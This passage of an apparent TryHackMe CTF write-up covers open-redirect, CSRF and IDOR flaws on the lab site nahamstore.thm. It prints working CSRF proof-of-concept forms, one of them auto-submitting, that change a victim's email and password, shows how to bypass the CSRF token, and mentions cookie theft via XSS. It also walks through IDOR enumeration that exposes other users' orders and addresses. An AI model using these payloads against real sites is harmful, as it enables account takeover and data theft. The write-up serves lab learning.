+works (in order to work just need to enter first http://nahamstore.thm/register?redirect_url=https://www.google.com then fill in the fields then press register)
+
+http://nahamstore.thm/login?redirect_url=/basket
+
+http://nahamstore.thm/login?redirect_url=https://www.google.com
+
+works (in order to work just need to enter first http://nahamstore.thm/login?redirect_url=https://www.google.com then fill in the fields then press register)
+```
+Open Redirect One
+*r*
+Open Redirect Two
+*redirect_url*
+### CSRF
+It's possible to change other users data just by getting them to visit a website you've crafted. Explore the web apps forms to find what could be vulnerable to a CSRF attack.
+Answer the questions below
+```text
+First we need to sign in and look for change email or pass and see if there's a CRRF token
+
+http://nahamstore.thm/account/settings
+http://nahamstore.thm/account/settings/email
+Email Changed
+
+let's intercept with burp
+
+POST /account/settings/email HTTP/1.1
+
+Host: nahamstore.thm
+
+Upgrade-Insecure-Requests: 1
+
+csrf_protect=eyJkYXRhIjoiZXlKMWMyVnlYMmxrSWpvMExDSjBhVzFsYzNSaGJYQWlPaUl4TmpjNU5ERTNOVGM0SW4wPSIsInNpZ25hdHVyZSI6IjI4MzcwZDAyYmIzODc3MmQ3MTBmNTU4ODZmOWFhMzRhIn0%3D&change_email=a1%40gmail.com
+
+we can remove csrf_protect to bypass it
+
+like this
+
+POST /account/settings/email HTTP/1.1
+
+Host: nahamstore.thm
+...
+change_email=a12%40gmail.com
+
+Email Changed
+
+:)
+
+we can also generate a PoC CSRF
+
+<html>
+
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+
+  <body>
+
+  <script>history.pushState('', '', '/')</script>
+
+    <form action="http://nahamstore.thm/account/settings/email" method="POST">
+
+      <input type="hidden" name="change&#95;email" value="a12&#64;gmail&#46;com" />
+
+      <input type="submit" value="Submit request" />
+
+    </form>
+
+  </body>
+
+</html>
+
+In order to get burpsuite professional go to
+https://github.com/SNGWN/Burp-Suite 
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ nano CSRF_poc.html
+                                                                                                                                      
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ cat CSRF_poc.html 
+<html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://nahamstore.thm/account/settings/email" method="POST">
+      <input type="hidden" name="change&#95;email" value="a12&#64;gmail&#46;com" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+let's create a new user 
+witty@gmail.com:test1234
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ python3 -m http.server 1234                             
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+
+http://10.8.19.103:1234/
+
+Directory listing for /
+
+    alivesubdomains.txt
+    aquatone_report.html
+    aquatone_session.json
+    aquatone_urls.txt
+    CSRF_poc.html
+    final_subdomain
+    headers/
+    html/
+    permutation_output
+    permutation_output_final
+    resolved_output.txt
+    screenshots/
+    subdomains.txt
+    words.txt
+
+after pressing CSRF_poc.html
+
+An account with this address already exists
+
+yep because we were already changed to this let's test with another like evil@gmail.com
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ python3 -m http.server 1234                             
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.8.19.103 - - [21/Mar/2023 13:08:17] "GET / HTTP/1.1" 200 -
+10.8.19.103 - - [21/Mar/2023 13:08:19] code 404, message File not found
+10.8.19.103 - - [21/Mar/2023 13:08:19] "GET /favicon.ico HTTP/1.1" 404 -
+10.8.19.103 - - [21/Mar/2023 13:12:19] "GET /CSRF_poc.html HTTP/1.1" 200 -
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ cat CSRF_poc.html
+<html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://nahamstore.thm/account/settings/email" method="POST">
+      <input type="hidden" name="change&#95;email" value="evil&#64;gmail&#46;com" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.8.19.103 - - [21/Mar/2023 13:14:43] "GET / HTTP/1.1" 200 -
+10.8.19.103 - - [21/Mar/2023 13:14:47] "GET /CSRF_poc.html HTTP/1.1" 200 -
+
+Email Changed (We did it :)
+
+and we wanna connect it again cannot cz the email witty@gmail.com is now evil@gmail.com
+
+Invalid Email or Password combination
+
+we can also do it with xss to steal cookies using webhook.site (check this)
+https://www.youtube.com/watch?v=_lKms-iZTWc&list=LL&index=1
+
+another way changing request method to GET (in this case not work but sometimes yep)
+
+Hiding button (unsuspicious method)
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ cat CSRF_poc.html
+<html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://nahamstore.thm/account/settings/email" method="POST">
+      <input type="hidden" name="change&#95;email" value="evil1&#64;gmail&#46;com" />
+      <input type="submit" style="display:none" value="Submit request" />
+    </form>
+  </body>
+  <script>document.forms[0].submit()</script>
+</html>
+
+:) un sus
+
+Email Changed
+evil@gmail.com
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.8.19.103 - - [21/Mar/2023 16:25:31] "GET / HTTP/1.1" 200 -
+10.8.19.103 - - [21/Mar/2023 16:25:35] "GET /CSRF_poc.html HTTP/1.1" 200 -
+
+Now changing pass
+
+http://nahamstore.thm/account/settings/password
+
+POST /account/settings/password HTTP/1.1
+
+Host: nahamstore.thm
+
+change_password=IbelieveinGod
+
+Here there is not csrf token (critical vulnerability)
+
+let's make a POC CSRF
+
+If u haven't burp pro u can use https://github.com/merttasci/csrf-poc-generator
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ cat CSRF_poc_pass.html 
+<html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://nahamstore.thm/account/settings/password" method="POST">
+      <input type="hidden" name="change&#95;password" value="IbelieveinGod" />
+      <input type="submit" style="display:none" value="Submit request" />
+    </form>
+  </body>
+  <script>document.forms[0].submit()</script>
+</html>
+
+let's test it
+
+┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
+└─$ python3 -m http.server 1234         
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.8.19.103 - - [21/Mar/2023 16:42:27] "GET / HTTP/1.1" 200 -
+10.8.19.103 - - [21/Mar/2023 16:42:31] "GET /CSRF_poc_pass.html HTTP/1.1" 200 -
+
+Password has been updated
+
+Now use decoder (csrf token)
+
+eyJkYXRhIjoiZXlKMWMyVnlYMmxrSWpvMExDSjBhVzFsYzNSaGJYQWlPaUl4TmpjNU5ERTNOVGM0SW4wPSIsInNpZ25hdHVyZSI6IjI4MzcwZDAyYmIzODc3MmQ3MTBmNTU4ODZmOWFhMzRhIn0%3D
+
+press smart decode and remove %3D
+
+From base64
+
+{"data":"eyJ1c2VyX2lkIjo0LCJ0aW1lc3RhbXAiOiIxNjc5NDE3NTc4In0=","signature":"28370d02bb38772d710f55886f9aa34aIn0
+
+here also have base64
+
+eyJ1c2VyX2lkIjo0LCJ0aW1lc3RhbXAiOiIxNjc5NDE3NTc4In0=
+
+highlight it
+
+{"data":"{"user_id":4,"timestamp":"1679417578"}","signature":"28370d02bb38772d710f55886f9aa34aIn0
+```
+![[Pasted image 20230321115915.png]]
+![[Pasted image 20230321121231.png]]
+![[Pasted image 20230321121531.png]]
+What URL has no CSRF protection
+*http://nahamstore.thm/account/settings/password*
+What field can be removed to defeat the CSRF protection
+*csrf_protect*
+What simple encoding is used to try and CSRF protect a form
+*base64*
+### IDOR
+In the web application, you'll find two IDOR vulnerabilities that allow you to read other users information.
+1) An existing user has an address in New York, find the first line of the address.
+2) The date and time of order ID 3
+Answer the questions below
+```text
+My favourite vuln :)
+
+First add to target/scope (host: nahamstore) 
+
+GET /returns/1?auth=c4ca4238a0b923820dcc509a6f75849b HTTP/1.1
+
+from md5 c4ca4238a0b923820dcc509a6f75849b is 1
+
+and let's check others
+
+GET /returns/2?auth=c81e728d9d4c2f636f067f89cc14862c HTTP/1.1
+
+Show response in browser
+
+Status: Awaiting Decision
+Order Number: 2
+Return Reason: Wrong Size
+
+GET /returns/3?auth=eccbc87e4b5ce2fe28308fd9f2a7baf3 HTTP/1.1
+
+HTTP/1.1 404 Not Found
+
+uhmm seems not IDOR
+
+let's check orders
+
+http://nahamstore.thm/account/orders/4
+
+GET /account/orders/5 HTTP/1.1
+
+HTTP/1.1 302 Found  (Follow redirection press)
+
+Id 	Order Name 	Order Items 	Order Total
+00004 	Mr h1hi h1hi 	1 	15.00
+
+is my order 4 and we don't get order 5
+
+Request
+
+POST /basket HTTP/1.1
+
+Host: nahamstore.thm
+
+address_id=1&card_no=1234123412341234
+
+Response
+HTTP/1.1 302 Found  (Follow redirection press)
+
+Shipping Address
+Mr Charles Cook
+4754 Swick Hill Street
+Harahan
+Louisiana
+70123
+Order Details
+Order Id: 6
+Order Date: 21/03/2023 21:42:10
+User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+and the others
+
+Shipping Address
+Mrs Rita Miles
+3914 Charles Street
+Farmington Hills
+Michigan
+48335
+Order Details
+Order Id: 7
+Order Date: 21/03/2023 21:42:28
+User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Shipping Address
+Mr Jimmy Jones
+3999 Clay Lick Road
+Englewood
+Colorado
+80112
+Order Details
+Order Id: 8
+Order Date: 21/03/2023 21:42:37
+User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Shipping Address
+Mr Jimmy Jones
+160 Broadway
+New York
+10038
+Order Details
+Order Id: 9
+Order Date: 21/03/2023 21:42:46
+User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Shipping Address
